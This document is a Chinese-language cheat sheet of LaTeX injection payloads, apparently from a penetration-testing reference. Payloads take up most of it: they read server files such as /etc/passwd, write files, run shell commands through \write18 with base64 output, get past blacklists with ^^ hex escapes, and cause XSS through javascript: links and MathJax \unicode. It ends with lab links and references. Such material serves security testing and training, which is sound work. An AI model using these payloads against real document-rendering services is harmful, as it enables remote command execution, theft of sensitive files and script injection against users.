# LaTeX 注入

> LaTeX 注入是一种注入攻击类型，其中恶意内容被注入到 LaTeX 文档中。LaTeX 广泛用于文档准备和排版，特别是在学术界，用于生成高质量的科学和数学文档。由于其强大的脚本功能，如果未采取适当的保护措施，LaTeX 可以被攻击者利用来执行任意命令。

## 概要

* [文件操作](#文件操作)
    * [读取文件](#读取文件)
    * [写入文件](#写入文件)
* [命令执行](#命令执行)
* [跨站脚本攻击](#跨站脚本攻击)
* [实验室](#实验室)
* [参考文献](#参考文献)

## 文件操作

### 读取文件

攻击者可以读取服务器上敏感文件的内容。

读取文件并解释其中的 LaTeX 代码：

```tex
\input{/etc/passwd}
\include{somefile} # 加载 .tex 文件 (somefile.tex)
```

读取单行文件：

```tex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

读取多行文件：

```tex
\lstinputlisting{/etc/passwd}
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

读取文本文件，**不**解释内容，只会粘贴原始文件内容：

```tex
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

如果注入点位于文档头之后（不能使用 `\usepackage`），可以通过禁用某些控制字符来在包含 `$`、`#`、`_`、`&`、空字节等的文件中使用 `\input`。

```tex
\catcode `\$=12
\catcode `\#=12
\catcode `\_=12
\catcode `\&=12
\input{path_to_script.pl}
```

要绕过黑名单，尝试用该字符的 Unicode 十六进制值替换它。

* `^^41` 表示大写字母 A
* `^^7e` 表示波浪号 (~)，注意 'e' 必须小写

```tex
\lstin^^70utlisting{/etc/passwd}
```

### 写入文件

写入单行文件：

```tex
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\write\outfile{Line 2}
\write\outfile{I like trains}
\closeout\outfile
```

## 命令执行

命令的输出将重定向到标准输出，因此需要使用临时文件来获取结果。

```tex
\immediate\write18{id > output}
\input{output}
```

如果遇到任何 LaTeX 错误，请考虑使用 base64 来获取结果而不包含不良字符（或使用 `\verbatiminput`）：

```tex
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```tex
\input|ls|base64
\input{|"/bin/hostname"}
```

## 跨站脚本攻击

来自 [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)

```tex
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```

在 [mathjax](https://docs.mathjax.org/en/latest/input/tex/extensions/unicode.html)

```tex
\unicode{<img src=1 onerror="<ARBITRARY_JS_CODE>">}
```

## 实验室

* [Root Me - LaTeX - 输入](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Input)
* [Root Me - LaTeX - 命令执行](https://www.root-me.org/en/Challenges/App-Script/LaTeX-Command-execution)

## 参考文献

* [用 LaTeX 黑客技术 - Sebastian Neef - 2016年3月10日](https://0day.work/hacking-with-latex/)
* [从 LaTeX 到 RCE，私人漏洞奖励计划 - Yasho - 2018年7月6日](https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a)
* [感谢 LaTeX 攻击同事 - scumjr - 2016年11月28日](http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)